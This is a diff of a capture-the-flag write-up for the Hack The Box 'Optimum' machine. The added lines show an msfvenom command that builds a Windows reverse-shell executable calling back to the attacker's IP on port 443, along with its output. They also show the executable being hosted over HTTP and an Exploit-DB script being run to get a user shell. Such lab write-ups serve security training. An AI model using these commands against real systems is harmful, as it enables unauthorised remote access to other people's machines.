@@ -64,12 +64,28 @@ Well there is😅. Lets exploit right away
 
 Well, I found this great exploit, you can download it [here](https://www.exploit-db.com/exploits/39161)
 
+
+
 So, we'll set the ```LHOST``` to our tun0 ip, we'll also set the ```LPORT``` to the port we plan on listening on
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/de36cb6b-4ff8-4fc4-a752-ca27abd72924)
 
 Save the script.
 
+As per the instruction in the script, we were told to host a ```nc.exe``` file, well I generated the ```.exe``` file using msfvenom
+
+command:```msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.43 LPORT=443 -f exe -o nc.exe```
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/optimum]                                                                                                                                             
+└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.43 LPORT=443 -f exe -o nc.exe                                                                                                          
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+Saved as: nc.exe
+```
 Ensure you have your netcat listener ready before running the script
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/35697632-7b3e-4ef6-a9f3-c6e3b673af51)
@@ -78,11 +94,23 @@ Running the script requires the target's ip and port
 
 command:```python2 39161.py 10.129.58.117 80```
 
-![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1080390a-86b9-4d15-9b11-a7fbad9a873b)
+Alongside running this script, we'll host the ```nc.exe``` file
+
+command:```python3 -m http.server 80```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5b672fd6-0647-4542-85b7-ea610ab8a276)
 
 Checking our netcat listener,
 
-![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9c3cb0c2-d092-4d9a-85f8-3dfeff0a1a1d)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3f9625a2-cadc-4c0d-aa9f-c5b27dddfd01)
+
+We didn't spawn a shell🥲, running the script again
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0b69eaaf-5c0c-43dd-a51f-967ee0e70029)
+
+Checking our netcat listener,
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ae181f7e-1f08-435b-be9d-878565aa2d11)
 
 We got a user shell🙂. Lets go ahead and escalate our privileges.
 
